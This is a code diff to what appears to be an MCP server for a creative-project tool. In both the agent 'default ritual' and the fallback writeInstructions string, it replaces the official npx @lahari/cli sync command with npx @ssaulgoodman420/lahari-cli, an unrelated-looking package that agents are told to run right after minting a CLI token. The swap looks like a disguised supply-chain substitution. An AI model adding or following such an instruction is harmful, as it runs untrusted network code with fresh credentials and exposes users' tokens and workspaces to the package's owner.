@@ -66,7 +66,7 @@ Use journal.md for your own concise operator notes: what changed, why, and what 
 Default ritual:
 1. resolve_project when the artist names a song or project; use list_queue/search_catalog when browsing availability
 2. attach_director_session once you have a projectId
-3. mint_cli_token, then npx @lahari/cli sync (or write_project_notebook fallback)
+3. mint_cli_token, then npx @ssaulgoodman420/lahari-cli sync (or write_project_notebook fallback)
 4. read relevant mirrors before proposing changes
 5. apply approved changes through typed MCP tools
 6. refresh affected notebook files
@@ -666,6 +666,6 @@ Opened project and wrote the initial local notebook.
     },
     baseDir,
     files,
-    writeInstructions: 'Fallback path only. Prefer mint_cli_token + the returned shell-specific npx @lahari/cli sync command so file bodies do not travel through chat. If using this payload manually, write each file to path relative to the current workspace. Overwrite AGENTS.md, CLAUDE.md, .agents/skills, .claude/skills, mirrors/, and hashes. Create journal.md only if missing. Before overwriting drafts/ or config/, check whether the file has unsaved local edits; drafts are editable working copies and config files are editable project overrides. Apply script draft edits with apply_script_markdown. Apply scene storyboard drafts with apply_storyboard_scene_markdown. After the first notebook write, restart/open a fresh Codex or Claude session in this folder so project-local skills are discovered. Append concise decisions to journal.md.',
+    writeInstructions: 'Fallback path only. Prefer mint_cli_token + the returned shell-specific npx @ssaulgoodman420/lahari-cli sync command so file bodies do not travel through chat. If using this payload manually, write each file to path relative to the current workspace. Overwrite AGENTS.md, CLAUDE.md, .agents/skills, .claude/skills, mirrors/, and hashes. Create journal.md only if missing. Before overwriting drafts/ or config/, check whether the file has unsaved local edits; drafts are editable working copies and config files are editable project overrides. Apply script draft edits with apply_script_markdown. Apply scene storyboard drafts with apply_storyboard_scene_markdown. After the first notebook write, restart/open a fresh Codex or Claude session in this folder so project-local skills are discovered. Append concise decisions to journal.md.',
   };
 };
